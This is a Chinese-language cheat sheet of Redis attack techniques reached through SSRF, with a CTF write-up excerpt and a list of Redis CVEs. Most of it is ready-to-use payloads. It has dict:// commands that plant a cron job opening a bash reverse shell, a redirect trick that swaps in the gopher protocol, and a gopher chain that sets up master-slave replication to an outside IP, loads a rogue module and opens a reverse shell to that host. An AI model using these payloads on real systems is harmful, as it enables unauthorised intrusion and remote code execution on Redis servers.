## Redis攻击技巧

1、dict协议也可以操作数据

```
dict://127.0.0.1:6379/config:set:dir:/var/spool/cron
dict://127.0.0.1:6379/config:set:dbfilename:root
dict://127.0.0.1:6379/set:1:nn*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1nn
dict://127.0.0.1:6379/save
```

这是面向未授权的情况，如果存在口令，需要维持会话才可以执行命令。

但dict发完自带一个quit，并不能维持会话。

2、有ssrf+redis弱口令，禁用gopher协议，怎么利用？

302跳转，利用http跳转换成gopher协议。

```
header('Location: gopher://ip:6379/xxxx')
```

3、gopher协议可以维持认证会话，如果直接写contrab在save的时候提示没权限，写shell不知道路径，可以使用主从复制getshell，例子：[网鼎杯ssrfme](https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652855735&idx=1&sn=ee5943cfe2498fdb894aa32b7f6a4a4a&chksm=bd59217a8a2ea86ce991ff62ab472d6cb9d6c18ba4c52167035c5fb70fc57648491af2eab74c&mpshare=1&scene=1&srcid=&sharer_sharetime=1590207696241&sharer_shareid=a7d99c78943a626e64cade4860efb7d9#rd)

```
直接在url栏输入需要两次URL编码
1、将dir设置到\tmp目录下，目录需可写
gopher://ctf.m0te.top:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit

gopher://ctf.m0te.top:6379/_auth welcometowangdingbeissrfme6379
config set dir /tmp/
quit

2、主从复制，在自己的VPS上起好了 rogue 服务器（github redis-rogue-server）
gopher://ctf.m0te.top:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%252039.107.68.253%252060001%250d%250aquit

gopher://ctf.m0te.top:6379/_auth welcometowangdingbeissrfme6379
config set dbfilename exp.so
slaveof 39.107.68.253 60001
quit

3、服务器监听
gopher://ctf.m0te.top:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250amodule%2520load%2520/tmp/exp.so%250d%250asystem.rev%252039.107.68.253%252060003%250d%250aquit

gopher://ctf.m0te.top:6379/_auth welcometowangdingbeissrfme6379
module load /tmp/exp.so
system.rev 39.107.68.253 60003
quit
```

## 其他

redis无写权限，无反序列化问题，不能主从复制getshell，怎么利用?

- Redis 远程代码执行漏洞(CVE-2016-8339)：Redis 3.2.x < 3.2.4版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis数据结构存储的CONFIG SET命令中client-output-buffer-limit选项处理存在越界写漏洞。构造的CONFIG SET命令可导致越界写，代码执行。
- CVE- -2015- -8080：Redis 2.8.x在2.8.24以前和3.0.x，在3.0.6以前版本，lua_ struct.c中存在getnum函数整数溢出，允许上下文相关的攻击者许可运行Lua代码（内存损坏和应用程序崩溃）或可能绕过沙盒限制意图通过大量，触发基于栈的缓冲区溢出。
- CVE-2015- -4335：Redis 2.8.1之前版本和3.0.2之前3. x版本中存在安全漏洞。远程攻击者可执行eval命令利用该漏洞执行任意Lua字节码。
- CVE- -2013-7458：读取". rediscli_history"配置文件信息。

## Demo

[一次“SSRF-->RCE”的艰难利用](https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247483865&idx=1&sn=41e56040229e383a82a671fc359ee82b)

## 引导

bypass ssrf的方式。